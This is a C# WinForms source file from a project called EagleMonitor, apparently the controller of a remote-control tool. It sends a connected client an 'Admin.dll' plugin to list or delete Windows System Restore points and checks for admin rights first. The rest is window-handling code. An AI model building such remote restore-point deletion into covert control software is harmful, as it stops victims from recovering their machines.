using EagleMonitor.Controls;
using EagleMonitor.Networking;
using EagleMonitor.Utils;
using PacketLib;
using PacketLib.Packet;
using System;
using System.IO;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.Forms
{
    public partial class RestorePointForm : FormPattern
    {
        private ClientHandler clientHandler { get; set; }

        internal RestorePointForm(ClientHandler clientHandler)
        {
            this.clientHandler = clientHandler;
            InitializeComponent();
        }

        private void RestorePointForm_Load(object sender, EventArgs e)
        {
            new Guna.UI2.WinForms.Helpers.DataGridViewScrollHelper(dataGridView1, guna2VScrollBar1, true);
            Miscellaneous.Enable(this.dataGridView1);

            if (clientHandler.isAdmin == false) 
            {
                this.optionsContextMenuStrip.Items[0].Enabled = false;
                this.optionsContextMenuStrip.Items[1].Enabled = false;
                MessageBox.Show("This feature requires admin rights to work !");
            }
        }

        private void resfreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            RestorePointPacket restorePointPacket = new RestorePointPacket
            {
                plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Miscellaneous.GPath + "\\Plugins\\Admin.dll"), 1)
            };
            this.clientHandler.SendPacket(restorePointPacket);
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow selected in dataGridView1.SelectedRows) 
            {
                DeleteRestorePointPacket deleteRestorePointPacket = new DeleteRestorePointPacket(int.Parse(selected.Cells[0].Value.ToString()))
                {
                    plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Miscellaneous.GPath + "\\Plugins\\Admin.dll"), 1)
                };
                this.clientHandler.SendPacket(deleteRestorePointPacket);
            }
        }

        private void closeButton_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void maximizeButton_Click(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Normal)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void minimizeButton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void label1_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(this.FindForm().Handle, 161, 2, 0);
        }
    }
}
